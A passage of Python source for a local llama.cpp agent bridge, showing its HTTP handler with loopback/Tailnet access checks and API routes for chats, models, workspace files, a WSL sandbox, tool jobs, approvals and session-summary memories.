            ipaddress.ip_address(hostname)             # any IP literal is fine
            return True
        except ValueError:
            return False

    def _peer_ok(self) -> bool:
        # Only THIS machine (loopback) or YOUR Tailnet (Tailscale's
        # 100.64.0.0/10 and fd7a:115c:a1e0::/48 ranges) may connect. Everyone
        # else on the local network — untrusted Wi-Fi and the like — is refused.
        # Tailscale already proves the remote device is yours, so no password is
        # needed. client_address is the real TCP peer; it can't be forged.
        import ipaddress
        try:
            ip = ipaddress.ip_address((self.client_address or ("",))[0])
        except (ValueError, IndexError, TypeError):
            return False
        if ip.is_loopback:
            return True
        for cidr in ("100.64.0.0/10", "fd7a:115c:a1e0::/48"):
            try:
                if ip in ipaddress.ip_network(cidr):
                    return True
            except ValueError:
                pass
        return False

    def _request_ok(self) -> bool:
        return self._peer_ok() and self._host_ok()

    def _send_json(self, status: int, obj: Any):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self._set_cors()
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def _send_bytes(self, status: int, data: bytes, ctype: str, extra_headers: dict | None = None):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        if extra_headers:
            for k, v in extra_headers.items():
                # Cache-Control passed via extra_headers takes precedence — overwrite
                if k.lower() == "cache-control":
                    continue
                self.send_header(k, v)
        self._set_cors()
        self.end_headers()
        try:
            self.wfile.write(data)
        except Exception:
            pass

    def _read_json(self) -> dict:
        ln = int(self.headers.get("Content-Length") or 0)
        if ln <= 0:
            return {}
        raw = self.rfile.read(ln)
        try:
            return json.loads(raw.decode("utf-8"))
        except Exception:
            return {}

    def do_OPTIONS(self):
        self.send_response(204)
        self._set_cors()
        self.end_headers()

    # ---- dispatch

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        p = parsed.path
        if not self._request_ok():
            return self._send_json(403, {"error": "forbidden"})
        try:
            if p == "/" or p == "":
                return self._serve_static("index.html")
            if p.startswith("/api/"):
                return self._handle_api_get(p, parsed)
            name = p.lstrip("/")
            if name in STATIC_WHITELIST or name.startswith("accuMOTION/"):
                return self._serve_static(name)
            return self._send_json(404, {"error": "not found"})
        except Exception as e:
            traceback.print_exc()
            self._send_json(500, {"error": str(e)})

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        p = parsed.path
        if not self._request_ok():
            return self._send_json(403, {"error": "forbidden"})
        try:
            if p.startswith("/api/"):
                return self._handle_api_post(p, parsed)
            return self._send_json(404, {"error": "not found"})
        except Exception as e:
            traceback.print_exc()
            self._send_json(500, {"error": str(e)})

    def do_DELETE(self):
        parsed = urllib.parse.urlparse(self.path)
        p = parsed.path
        if not self._request_ok():
            return self._send_json(403, {"error": "forbidden"})
        try:
            if p.startswith("/api/chats/"):
                cid = p.split("/")[-1]
                chats = get_chats()
                if cid in chats["chats"]:
                    chats["chats"].pop(cid)
                    chats["order"] = [x for x in chats["order"] if x != cid]
                    save_json(CHATS_FILE, chats)
                    shutil.rmtree(VERSIONS_DIR / cid, ignore_errors=True)
                    return self._send_json(200, {"ok": True})
                return self._send_json(404, {"error": "not found"})
            if p == "/api/cmd-history":
                # Wipe the cmd history file. No partial / per-chat delete for
                # now — simpler that the only "clear" action is "clear all".
                try:
                    with _cmd_history_lock:
                        if CMD_HISTORY_FILE.exists():
                            CMD_HISTORY_FILE.unlink()
                except Exception as e:
                    return self._send_json(500, {"error": str(e)})
                return self._send_json(200, {"ok": True, "cleared": True})
            return self._send_json(404, {"error": "not found"})
        except Exception as e:
            traceback.print_exc()
            self._send_json(500, {"error": str(e)})

    def _serve_static(self, name: str):
        full = ROOT / name
        if not full.is_file():
            return self._send_json(404, {"error": f"missing: {name}"})
        data = full.read_bytes()
        ctype = MIME.get(full.suffix, "application/octet-stream")
        self._send_bytes(200, data, ctype)

    # ---- API routes

    def _handle_api_get(self, p: str, parsed):
        if p == "/api/health":
            return self._send_json(200, {
                "ok": True,
                "llama": LLAMA,
                "vision_llama": VISION_LLAMA,
                "llama_up": llama_ping(timeout=1.0),
                # legacy alias so older frontend builds don't break
                "ollama": LLAMA,
            })
        if p == "/api/llama-log":
            # Live tail of the llama.cpp backend's stdout/stderr — powers the
            # Backend terminal tab so model loads/reloads show real progress.
            qs = urllib.parse.parse_qs(parsed.query)
            try:
                tail = int(qs.get("tail", ["400"])[0])
            except Exception:
                tail = 400
            return self._send_json(200, _llama.read_log(max(1, min(tail, 800))))
        if p == "/api/session/list":
            return self._send_json(200, {"sessions": _session_mgr.list()})
        if p == "/api/session/read":
            qs = urllib.parse.parse_qs(parsed.query)
            sid = (qs.get("id", [""])[0] or "").strip()
            try:
                since = int(qs.get("since", ["0"])[0])
            except Exception:
                since = 0
            s = _session_mgr.get(sid)
            if not s:
                return self._send_json(404, {"error": "no such session", "alive": False})
            out, offset = s.read_since(since)
            return self._send_json(200, {"output": out, "offset": offset, "alive": s.alive(),
                                         "exit_code": s.exit_code(), "command": s.command})
        if p == "/api/models":
            # List .gguf files under settings.models_dir. Each entry includes a
            # `loaded` flag so the UI can highlight the active model.
            s = get_settings()
            mdir = (s.get("models_dir") or "").strip()
            files = scan_gguf_dir(mdir)
            loaded = _llama.loaded_model() or s.get("model_path") or ""
            for f in files:
                f["loaded"] = (f["path"] == loaded)
            return self._send_json(200, {
                "models_dir": mdir,
                "loaded_model": loaded,
                "llama_running": _llama.is_running() or llama_ping(timeout=0.5),
                "vision_capable": _llama.is_vision_capable(),
                "loaded_mmproj": _llama.loaded_mmproj(),
                "models": files,
            })
        if p.startswith("/api/model-info/"):
            name = urllib.parse.unquote(p[len("/api/model-info/"):])
            return self._send_json(200, recommended_settings(name))
        if p == "/api/settings":
            return self._send_json(200, get_settings())
        if p == "/api/workspace":
            return self._send_json(200, get_workspace())
        if p == "/api/workspace/files":
            # Flat, bounded file list across all workspace folders — powers the
            # @-mention picker in the composer. Skips heavy/vendor dirs.
            skip = ("/node_modules/", "/.git/", "/__pycache__/", "/.venv/",
                    "/venv/", "/dist/", "/build/", "/.next/", "/.cache/")
            ws = get_workspace()
            out = []
            seen = set()
            for root in (ws.get("folders") or []):
                if len(out) >= 4000:
                    break
                try:
                    base = Path(root)
                    for f in safe_rglob_files(root, "*", max_depth=8):
                        ap = str(f.resolve())
                        if ap in seen:
                            continue
                        seen.add(ap)
                        try:
                            rel = str(f.relative_to(base)).replace("\\", "/")
                        except Exception:
                            rel = f.name
                        if any(sd in ("/" + rel) for sd in skip):
                            continue
                        out.append({"name": f.name, "rel": rel, "path": ap})
                        if len(out) >= 4000:
                            break
                except Exception:
                    continue
            out.sort(key=lambda m: m["rel"].lower())
            return self._send_json(200, {"files": out, "count": len(out), "truncated": len(out) >= 4000})
        if p == "/api/link_preview":
            # Hover-preview support for clickable links inside chat bubbles.
            # Lightweight: fetches the page, pulls Open Graph + <title>, caches
            # in-process. Frontend lazy-loads on first hover, so the cost is
            # paid only when the user actually wants the preview.
            qs = urllib.parse.parse_qs(parsed.query)
            url = (qs.get("url", [""])[0] or "").strip()
            if not url:
                return self._send_json(400, {"error": "url required"})
            return self._send_json(200, fetch_link_preview(url))
        if p == "/api/ctx-stats":
            s = get_settings()
            # Live server ctx is the real capacity — settings.num_ctx can drift
            # from how llama-server was actually launched.
            cap = _llama_props_ctx() or int(s.get("num_ctx") or 32768)
            qs = urllib.parse.parse_qs(parsed.query)
            chat_id = (qs.get("chat_id", [""])[0] or "").strip()
            # Per-chat real count (llama-server's prompt_eval_count) is the
            # ground truth once a turn has completed. Before that, tokenize the
            # assembled prompt for an accurate cold-start number.
            real = _last_prompt_tokens_by_chat.get(chat_id, 0) if chat_id else _last_prompt_tokens
            if real > 0:
                return self._send_json(200, {"prompt_tokens": real, "capacity": cap, "source": "live"})
            est = _estimate_context_tokens(chat_id) if chat_id else 0
            return self._send_json(200, {"prompt_tokens": est, "capacity": cap,
                                         "source": "tokenize" if est else "none"})
        if p == "/api/chats":
            return self._send_json(200, get_chats())
        if p == "/api/approvals":
            return self._send_json(200, {"pending": list_approvals()})
        if p.startswith("/api/versions/"):
            parts = p.split("/")
            # /api/versions/<chat_id>          -> list
            # /api/versions/<chat_id>/<vid>    -> html
            if len(parts) == 4:
                return self._send_json(200, {"versions": list_versions(parts[3])})
            if len(parts) == 5:
                html = read_version(parts[3], parts[4])
                if html is None:
                    return self._send_json(404, {"error": "not found"})
                return self._send_bytes(200, html.encode("utf-8"), "text/html; charset=utf-8")
        if p == "/api/events":
            return self._serve_sse()
        if p == "/api/system-context":
            try:
                md = ensure_system_context()
            except Exception as e:
                return self._send_json(200, {"md": "", "path": str(SYSTEM_CONTEXT_FILE), "exists": False, "error": str(e)})
            return self._send_json(200, {
                "md": md,
                "path": str(SYSTEM_CONTEXT_FILE),
                "exists": SYSTEM_CONTEXT_FILE.exists(),
            })
        if p == "/api/memories":
            return self._send_json(200, {"memories": _load_memories(), "path": str(MEMORIES_FILE)})
        if p == "/api/cmd-history":
            # GET ?limit=200&chat_id=XYZ — newest entries first. Optional
            # chat_id filter scopes the list to one conversation; omit it
            # for the global view.
            ch_qs = urllib.parse.parse_qs(parsed.query)
            try:
                limit = int(ch_qs.get("limit", ["200"])[0])
            except Exception:
                limit = 200
            limit = max(1, min(limit, 2000))
            chat_id = (ch_qs.get("chat_id", [""])[0] or "").strip()
            return self._send_json(200, {
                "entries": _read_cmd_history(limit=limit, chat_id=chat_id),
                "limit": limit,
                "chat_id": chat_id,
                "cap": CMD_HISTORY_MAX,
            })
        if p.startswith("/api/desktop/chat-state/"):
            # GET the per-chat desktop-disabled flag
            cid = p.split("/", 4)[4]
            return self._send_json(200, {
                "chat_id": cid,
                "disabled": cid in _chat_desktop_disabled,
            })
        if p.startswith("/api/chats/") and p.count("/") == 3:
            # GET a single chat's metadata (for restoring last_mode on switch)
            cid = p.split("/")[3]
            chats = get_chats()
            if cid in chats["chats"]:
                return self._send_json(200, chats["chats"][cid])
            return self._send_json(404, {"error": "not found"})
        if p == "/api/snapshots":
            out = []
            for f in sorted(SNAPSHOTS_DIR.glob("*.html")):
                try:
                    st = f.stat()
                    out.append({"name": f.name, "size": st.st_size, "mtime": int(st.st_mtime)})
                except Exception:
                    continue
            return self._send_json(200, {"snapshots": out, "path": str(SNAPSHOTS_DIR)})
        if p.startswith("/api/snapshots/"):
            # serve a single saved snapshot by filename (no path traversal)
            fname = p.split("/", 3)[3]
            if "/" in fname or "\\" in fname or ".." in fname:
                return self._send_json(400, {"error": "bad name"})
            fp = SNAPSHOTS_DIR / fname
            if not fp.exists() or not fp.is_file():
                return self._send_json(404, {"error": "not found"})
            return self._send_bytes(200, fp.read_bytes(), "text/html; charset=utf-8")
        if p.startswith("/api/jobs/"):
            job_id = p.split("/")[3]
            with _tool_jobs_lock:
                job = _tool_jobs.get(job_id)
            if not job:
                return self._send_json(404, {"error": "not found"})
            return self._send_json(200, {
                "id": job_id,
                "status": job.get("status"),
                "result": job.get("result"),
                "started": job.get("started"),
                "finished": job.get("finished"),
            })
        if p == "/api/desktop/status":
            s = get_settings()
            return self._send_json(200, {
                "enabled": bool(s.get("desktop_enabled")),
                "panic": _desktop_panic.is_set(),
                "have_pyautogui": _HAVE_PYAUTOGUI,
                "have_pil": _HAVE_PIL,
                "have_pygetwindow": _HAVE_PGW,
                "allowlist": s.get("desktop_app_allowlist") or [],
                "max_actions_per_minute": int(s.get("desktop_max_actions_per_minute") or 30),
            })
        if p.startswith("/api/wsfs/"):
            # Stream a single file from inside a configured workspace folder.
            # Path-style URL on purpose: `/api/wsfs/<token>/<relative>`. This
            # way the browser's relative-URL resolution (which only looks at
            # the URL *path*, not the query string) correctly maps an HTML
            # file's `./style.css` to `/api/wsfs/<token>/style.css` — keeping
            # every fetched asset routed through this same hardened endpoint.
            #
            # Token is urlsafe-base64 of the configured workspace root path.
            # The root is then re-validated against the live workspace list
            # on every request, so revoking a folder kills outstanding URLs.
            rest = p[len("/api/wsfs/"):]
            if "/" not in rest:
                return self._send_json(400, {"error": "missing path"})
            token, rel = rest.split("/", 1)
            try:
                # add padding back for b64decode (we strip it on the JS side)
                pad = "=" * (-len(token) % 4)
                root = _b64.urlsafe_b64decode((token + pad).encode("ascii")).decode("utf-8")
            except Exception:
                return self._send_json(400, {"error": "bad root token"})
            rel = urllib.parse.unquote(rel)
            target, err = resolve_workspace_file(root, rel)
            if err:
                msg = err.get("error", "")
                code = 403 if ("escape" in msg or "absolute" in msg or "not in workspace" in msg) else 404
                return self._send_json(code, err)
            try:
                size = target.stat().st_size
            except Exception:
                return self._send_json(500, {"error": "stat failed"})
            if size > _WS_FILE_MAX_BYTES:
                return self._send_json(413, {"error": f"file too large (>{_WS_FILE_MAX_BYTES // (1024*1024)} MB)"})
            try:
                data = target.read_bytes()
            except Exception as e:
                return self._send_json(500, {"error": f"read failed: {e}"})
            ct = _WS_FILE_MIME.get(target.suffix.lower(), "application/octet-stream")
            extra = {
                "X-Content-Type-Options": "nosniff",
                "Referrer-Policy": "no-referrer",
                "Cache-Control": "no-store",
            }
            return self._send_bytes(200, data, ct, extra_headers=extra)
        if p == "/api/llama/detect-vram":
            # GET — best-effort GPU VRAM probe via nvidia-smi. Used by the
            # Settings drawer to pre-fill the VRAM tier dropdown.
            return self._send_json(200, detect_vram_gb())
        if p == "/api/list-folder":
            qs = urllib.parse.parse_qs(parsed.query)
            raw = (qs.get("path") or [""])[0]
            if not raw:
                return self._send_json(400, {"error": "path required"})
            target = Path(normalize_path(raw))
            # only allow listing inside configured workspace folders
            ws = get_workspace().get("folders", [])
            target_resolved = None
            try:
                target_resolved = target.resolve()
            except Exception:
                return self._send_json(400, {"error": "bad path"})
            allowed = False
            for f in ws:
                try:
                    root = Path(f).resolve()
                    if str(target_resolved).lower().startswith(str(root).lower()):
                        allowed = True
                        break
                except Exception:
                    continue
            if not allowed:
                return self._send_json(403, {"error": "path outside workspace"})
            if not target_resolved.exists() or not target_resolved.is_dir():
                return self._send_json(404, {"error": "not a directory"})
            entries = []
            try:
                for child in sorted(target_resolved.iterdir(), key=lambda p: (not p.is_dir(), p.name.lower())):
                    try:
                        is_dir = child.is_dir()
                        info = {
                            "name": child.name,
                            "path": str(child),
                            "is_dir": is_dir,
                            "size": 0 if is_dir else child.stat().st_size,
                            "ext": "" if is_dir else child.suffix.lstrip(".").lower(),
                        }
                        entries.append(info)
                    except Exception:
                        continue
            except PermissionError:
                return self._send_json(403, {"error": "permission denied"})
            return self._send_json(200, {"path": str(target_resolved), "entries": entries})
        if p == "/api/setup/sysinfo":
            info = detect_hardware_specs()
            return self._send_json(200, info)
        if p == "/api/setup/download-status":
            with DOWNLOAD_LOCK:
                return self._send_json(200, DOWNLOAD_STATE)
        if p == "/api/sandbox/status":
            return self._send_json(200, wsl_probe())
        if p == "/api/setup/detect":
            # Scan for llama-server.exe in common locations and list available models.
            # Returns data for the initial setup wizard so new users don't have to
            # manually edit settings.json.
            s = get_settings()
            mdir = (s.get("models_dir") or "").strip()
            
            # Detect llama-server paths
            llama_paths = []
            explicit = (s.get("llama_bin") or "").strip()
            if explicit and safe_exists(explicit):
                llama_paths.append({"path": explicit, "found": True, "label": "Custom path (settings)"})
                
            # Auto-detect via find_llama_bin
            auto = find_llama_bin()
            if auto and not any(lp["path"] == auto for lp in llama_paths):
                llama_paths.append({"path": auto, "found": True, "label": "Auto-detected"})
                
            # Scan common fallback locations
            home = Path.home()
            candidates = [
                (home / ".unsloth/llama.cpp/build/bin/Release/llama-server.exe", "Unstable build (Release)"),
                (home / ".unsloth/llama.cpp/build/bin/llama-server.exe", "Unstable build"),
                (home / ".docker/bin/inference/llama-server.exe", "Docker inference"),
                (home / "llama.cpp/build/bin/Release/llama-server.exe", "llama.cpp Release"),
                (home / "llama.cpp/llama-server.exe", "llama.cpp root"),
                (Path("C:/llama.cpp/build/bin/Release/llama-server.exe"), "C:/llama.cpp Release"),
                (Path("C:/llama.cpp/llama-server.exe"), "C:/llama.cpp root"),
            ]
            for c, label in candidates:
                if safe_exists(c) and not any(lp["path"] == str(c) for lp in llama_paths):
                    llama_paths.append({"path": str(c), "found": True, "label": label})
                    
            # List models in the configured directory if any
            models = []
            if mdir and safe_exists(mdir):
                models = scan_gguf_dir(mdir)
                
            # If no models found in configured directory or models_dir is empty,
            # scan other drives/common folders to auto-suggest models
            auto_models = find_all_gguf_files()
            if not models and auto_models:
                models = auto_models
                # Suggest a default models_dir from the parent folder of the newest found model.
                if not mdir:
                    best_model_path = auto_models[0]["path"]
                    try:
                        mdir = str(Path(best_model_path).parent.resolve())
                    except Exception:
                        pass
                        
            return self._send_json(200, {
                "llama_paths": llama_paths,
                "models_dir": mdir,
                "models": models,
                "settings": s,
            })
        return self._send_json(404, {"error": "not found"})

    def _handle_api_post(self, p: str, parsed):
        body = self._read_json()
        if p == "/api/setup/download-llama":
            build_type = body.get("build_type", "CPU")
            threading.Thread(target=download_and_extract_llama, args=(build_type,), daemon=True).start()
            return self._send_json(200, {"success": True})
        if p == "/api/sandbox/setup":
            return self._send_json(200, start_sandbox_setup(reinstall=bool(body.get("reinstall"))))
        if p == "/api/sandbox/test":
            return self._send_json(200, sandbox_selftest())
        if p == "/api/sandbox/remove":
            _wsl_run(["--terminate", SANDBOX_DISTRO], timeout=60)
            rc, out = _wsl_run(["--unregister", SANDBOX_DISTRO], timeout=120)
            try:
                if SANDBOX_STATE_FILE.exists():
                    SANDBOX_STATE_FILE.unlink()
            except Exception:
                pass
            _sbx_set(status="idle", step="", pct=0, error="", log=[])
            broadcast_event({"type": "sandbox:update"})
            return self._send_json(200, {"removed": rc == 0, "output": (out or "").strip()[:400]})
        if p == "/api/settings":
            cur = get_settings()
            cur.update({k: v for k, v in body.items() if k in DEFAULT_SETTINGS})
            save_json(SETTINGS_FILE, cur)
            broadcast_event({"type": "settings:update"})
            return self._send_json(200, cur)
        if p == "/api/workspace":
            folders = body.get("folders") or []
            folders = [normalize_path(f) for f in folders if isinstance(f, str) and f.strip()]
            save_json(WORKSPACE_FILE, {"folders": folders})
            resolved_ws = get_workspace()
            broadcast_event({"type": "workspace:update"})
            return self._send_json(200, resolved_ws)
        if p == "/api/save-to-workspace":
            # Direct save of preview HTML to a workspace folder. Skips the
            # model loop entirely — the frontend "Save to workspace" button
            # in the preview pane uses this so the user doesn't have to ask
            # the agent to regenerate HTML it already has on disk.
            # Body: {root: "<configured workspace folder>", filename: "x.html",
            #        html: "<!DOCTYPE...>", overwrite?: bool}
            root = (body.get("root") or "").strip()
            filename = (body.get("filename") or "").strip()
            html = body.get("html")
            overwrite = bool(body.get("overwrite"))
            if not root or not filename or not isinstance(html, str):
                return self._send_json(400, {"error": "root, filename, and html required"})
            # filename safety: no slashes, no traversal, must end in something
            # textual. We don't constrain the extension — could be .html /
            # .htm / .txt depending on user intent.
            if "/" in filename or "\\" in filename or ".." in filename:
                return self._send_json(400, {"error": "filename must be a bare name (no slashes, no ..)"})
            if not filename.strip("."):
                return self._send_json(400, {"error": "invalid filename"})
            # validate root against configured workspace
            configured = [normalize_path(f) for f in get_workspace().get("folders", [])]
            root_norm = normalize_path(root)
            if root_norm not in configured:
                return self._send_json(400, {"error": "root not in configured workspace folders"})
            try:
                root_path = Path(root_norm).resolve(strict=True)
            except Exception:
                return self._send_json(400, {"error": "workspace root unreadable"})
            target = (root_path / filename).resolve()
            # belt & braces: ensure the resolved target is still inside root
            try:
                target.relative_to(root_path)
            except ValueError:
                return self._send_json(400, {"error": "resolved path escapes workspace root"})
            if target.exists() and not overwrite:
                return self._send_json(409, {"error": "file exists", "path": str(target), "exists": True})
            try:
                target.write_text(html, encoding="utf-8")
                return self._send_json(200, {
                    "ok": True,
                    "path": str(target),
                    "bytes": len(html.encode("utf-8")),
                })
            except Exception as e:
                return self._send_json(500, {"error": str(e)})
        if p == "/api/py-check":
            # Pure syntax check — never executes the code, never imports
            # anything. compile() builds the AST and validates structure;
            # SyntaxError gives us line/col/msg for the diagnostic banner.
            # Accepts either {root, path} (read from workspace) or {code}
            # (raw snippet — used for unsaved buffers later if needed).
            code = body.get("code")
            file_label = "<snippet>"
            if code is None:
                root = body.get("root") or ""
                rel = body.get("path") or ""
                target, err = resolve_workspace_file(root, rel)
                if err:
                    return self._send_json(400, err)
                # 5 MB cap on Python files for the syntax check — anything
                # bigger is almost certainly not a real source file.
                try:
                    if target.stat().st_size > 5 * 1024 * 1024:
                        return self._send_json(413, {"error": "file too large for syntax check"})
                    code = target.read_text(encoding="utf-8", errors="replace")
                    file_label = target.name
                except Exception as e:
                    return self._send_json(500, {"error": f"read failed: {e}"})
            else:
                code = str(code)
            try:
                compile(code, file_label, "exec")
                return self._send_json(200, {
                    "ok": True,
                    "file": file_label,
                    "lines": code.count("\n") + 1,
                    "msg": "syntax OK",
                })
            except SyntaxError as e:
                return self._send_json(200, {
                    "ok": False,
                    "file": file_label,
                    "line": e.lineno,
                    "col": e.offset,
                    "end_line": getattr(e, "end_lineno", None),
                    "end_col": getattr(e, "end_offset", None),
                    "msg": e.msg,
                    "hint": (e.text or "").rstrip("\n"),
                })
            except ValueError as e:
                # null bytes in source etc.
                return self._send_json(200, {"ok": False, "file": file_label, "msg": str(e)})
        if p == "/api/llama/auto-tune":
            # POST {model_path?, vram_gb} -> suggested llama-server settings.
            # If model_path is omitted, uses the currently configured model_path
            # from settings. If vram_gb is omitted or 0, tries nvidia-smi.
            mp = (body.get("model_path") or get_settings().get("model_path") or "").strip()
            vram = float(body.get("vram_gb") or 0)
            detected = None
            if vram <= 0:
                detected = detect_vram_gb()
                vram = float(detected.get("gb") or 0)
            suggested = auto_tune(mp, vram)
            profile = inspect_model(mp)
            return self._send_json(200, {
                "vram_gb": vram,
                "vram_source": (detected or {}).get("source", "user"),
                "vram_name": (detected or {}).get("name", ""),
                "model": profile,
                "suggested": suggested,
            })
        if p == "/api/browse-folder":
            # native OS folder picker, only on the machine running the bridge.
            title = (body.get("title") or "Pick a folder").strip()
            try:
                import tkinter as tk
                from tkinter import filedialog
                root = tk.Tk()
                root.withdraw()
                root.attributes("-topmost", True)
                path = filedialog.askdirectory(title=title)
                root.destroy()
                return self._send_json(200, {"path": path or ""})
            except Exception as e:
                return self._send_json(200, {"path": "", "error": str(e)})
        if p == "/api/models/scan-dir":
            # Save settings.models_dir and immediately return the scan.
            new_dir = (body.get("path") or "").strip()
            if new_dir and not Path(new_dir).is_dir():
                return self._send_json(400, {"error": f"not a directory: {new_dir}"})
            s = get_settings()
            s["models_dir"] = new_dir
            save_json(SETTINGS_FILE, s)
            files = scan_gguf_dir(new_dir)
            loaded = _llama.loaded_model() or s.get("model_path") or ""
            for f in files:
                f["loaded"] = (f["path"] == loaded)
            broadcast_event({"type": "models:update"})
            return self._send_json(200, {
                "models_dir": new_dir,
                "loaded_model": loaded,
                "models": files,
            })
        if p == "/api/session/send":
            # The human operator typing into the shared session — no approval
            # gate here (that's the user at their own keyboard, not the model).
            sid = (body.get("id") or body.get("session_id") or "").strip()
            s = _session_mgr.get(sid)
            if not s:
                return self._send_json(404, {"error": "no such session"})
            ok = s.send(str(body.get("input", "")), enter=bool(body.get("enter", True)))
            return self._send_json(200, {"ok": ok, "alive": s.alive()})
        if p == "/api/session/stop":
            sid = (body.get("id") or body.get("session_id") or "").strip()
            return self._send_json(200, {"stopped": _session_mgr.stop(sid)})
        if p == "/api/models/load":
            # Switch the active model. Kills current llama-server, spawns new.
            target = (body.get("path") or "").strip()
            if not target:
                return self._send_json(400, {"error": "path required"})
            if not safe_exists(target):
                return self._send_json(400, {"error": f"file not found: {target}"})
            
            s = get_settings()
            if target != _llama.loaded_model():
                # Clear the explicit projector path on model switch so we don't
                # crash trying to load an incompatible mmproj. Auto-detect will
                # find the correct one if it exists.
                s["mmproj_path"] = ""
                save_json(SETTINGS_FILE, s)
                
            res = _llama.start(target)
            if res.get("ok"):
                s = get_settings()
                s["model_path"] = target
                # Use the basename without extension as the model id the chat
                # API sends to llama-server. (llama-server accepts any id but
                # logs/UI look nicer with a clean name.)
                s["model"] = Path(target).stem
                save_json(SETTINGS_FILE, s)
                _start_vision_fallback_if_needed(s)
                broadcast_event({"type": "models:update", "loaded_model": target})
                # Compile the tool-call grammar now (background) so the user's
                # FIRST real turn emits structured tool_calls instead of leaking
                # the call as plain text — the "say hi first" cold-start bug.
                # Skipped for Gemma, which runs text-tools (no `tools` on wire).
                if not _is_gemma_model(s.get("model") or target):
                    threading.Thread(target=_warmup_tool_grammar, daemon=True).start()
            return self._send_json(200 if res.get("ok") else 500, res)
        if p == "/api/models/stop":
            # User-initiated stop: also tells the watchdog "leave it down"
            # so a perfectly healthy llama doesn't immediately respawn 5s
            # later. The next /api/models/load re-arms the watchdog.
            _llama.stop_permanent()
            _vision_llama.stop_permanent()
            broadcast_event({"type": "models:update", "loaded_model": ""})
            return self._send_json(200, {"ok": True})
        if p == "/api/models/watchdog":
            return self._send_json(200, _llama.watchdog_status())
        if p == "/api/models/probe-mmproj":
            # Auto-detect helper for the Settings panel: "given this model
            # path, is there a sibling vision projector?" Returns the resolved
            # path or "" so the UI can fill the input or show "none found".
            target = (body.get("path") or "").strip()
            if not target:
                # default to the currently loaded / configured model
                target = _llama.loaded_model() or (get_settings().get("model_path") or "")
            mmproj = find_mmproj_for(target) if target else ""
            return self._send_json(200, {
                "ok": True,
                "model_path": target,
                "mmproj_path": mmproj,
            })
        if p == "/api/chats":
            chat_id = body.get("id") or uuid.uuid4().hex[:12]
            chats = get_chats()
            if chat_id not in chats["chats"]:
                # `origin` records where the session was started — "mobile" or
                # "desktop". The chat list uses it to swap in a phone icon for
                # mobile-born sessions so you can spot them at a glance.
                origin = (body.get("origin") or "desktop").strip().lower()
                if origin not in ("mobile", "desktop"):
                    origin = "desktop"
                chats["chats"][chat_id] = {
                    "id": chat_id,
                    "title": body.get("title") or "new session",
                    "created": int(time.time()),
                    "updated": int(time.time()),
                    "messages": [],
                    "origin": origin,
                }
                chats["order"].insert(0, chat_id)
                save_json(CHATS_FILE, chats)
            return self._send_json(200, chats["chats"][chat_id])
        if p.startswith("/api/chats/") and p.endswith("/rename"):
            cid = p.split("/")[3]
            chats = get_chats()
            if cid in chats["chats"]:
                chats["chats"][cid]["title"] = (body.get("title") or "").strip() or chats["chats"][cid]["title"]
                save_json(CHATS_FILE, chats)
                return self._send_json(200, chats["chats"][cid])
            return self._send_json(404, {"error": "not found"})
        if p == "/api/approvals/decide":
            ok = decide_approval(body.get("id") or "", body.get("decision") or "deny")
            return self._send_json(200 if ok else 404, {"ok": ok})
        if p == "/api/tools/call":
            job_id = uuid.uuid4().hex[:12]
            name = body.get("name") or ""
            args = body.get("arguments") or {}

            def _do_job():
                with _tool_jobs_lock:
                    _tool_jobs[job_id]["status"] = "running"
                try:
                    result = invoke_tool(name, args)
                    with _tool_jobs_lock:
                        _tool_jobs[job_id]["status"] = "done"
                        _tool_jobs[job_id]["result"] = result
                except Exception as e:
                    with _tool_jobs_lock:
                        _tool_jobs[job_id]["status"] = "error"
                        _tool_jobs[job_id]["result"] = {"error": str(e)}
                finally:
                    with _tool_jobs_lock:
                        _tool_jobs[job_id]["finished"] = int(time.time())

            with _tool_jobs_lock:
                _tool_jobs[job_id] = {
                    "id": job_id,
                    "status": "queued",
                    "name": name,
                    "started": int(time.time()),
                    "finished": None,
                    "result": None,
                }
            _tool_executor.submit(_do_job)
            return self._send_json(202, {"job_id": job_id, "status": "queued"})
        if p == "/api/chat":
            return self._handle_chat(body)
        if p == "/api/shutdown":
            save = bool(body.get("save"))
            if save:
                messages = body.get("messages") or []
                text_history = []
                for m in messages:
                    role = m.get("role", "")
                    if role in ("user", "assistant"):
                        text_history.append(f"{role.upper()}: {m.get('content')}")
                history_str = "\n\n".join(text_history)[-20000:]
                
                prompt = (
                    "System: You are a summarizer. Summarize this session in 1-3 sentences. "
                    "Focus on what was worked on, any decisions made, and unresolved threads. Be concise.\n\n"
                    "Conversation:\n" + history_str + "\n\n"
                    "Provide your response exactly in this format:\n"
                    "SUMMARY: <your 1-3 sentence summary>\n"
                    "TAGS: <tag1>, <tag2>, <tag3>\n"
                )
                
                settings = get_settings()
                payload = {
                    "model": settings.get("model", ""),
                    "messages": [{"role": "user", "content": prompt}],
                    "temperature": 0.3,
                    "max_tokens": 1500,
                    "stream": False,
                }
                try:
                    res = llama_post("/v1/chat/completions", payload, timeout=120)
                    content = res.get("choices", [{}])[0].get("message", {}).get("content", "")
                    summary = ""
                    tags = []
                    lines = content.strip().split("\n")
                    for line in lines:
                        if line.startswith("SUMMARY:"):
                            summary = line.replace("SUMMARY:", "").strip()
                        elif line.startswith("TAGS:"):
                            tags_str = line.replace("TAGS:", "").strip()
                            tags = [t.strip() for t in tags_str.split(",") if t.strip()]
                    
                    if not summary:
                        summary = content.strip()
                        
                    if summary:
                        memories = _load_memories()
                        new_mem = {
                            "id": uuid.uuid4().hex[:12],
                            "text": summary,
                            "tags": tags,
                            "created": int(time.time()),
                            "use_count": 0
                        }
                        memories.append(new_mem)
                        _save_memories(memories)
                except Exception as e:
                    print("Shutdown summary error:", e)
            
            def hard_exit():
                time.sleep(1)
                try:
                    _llama.stop()
                    _vision_llama.stop()
                except:
                    pass
                os._exit(0)
            threading.Thread(target=hard_exit, daemon=True).start()
            return self._send_json(200, {"ok": True})
        if p == "/api/cancel":
            cid = (body.get("chat_id") or "").strip()
            if not cid:
                return self._send_json(400, {"error": "chat_id required"})
            ok = cancel_chat(cid)
            return self._send_json(200, {"ok": ok, "chat_id": cid})
        if p == "/api/prewarm":
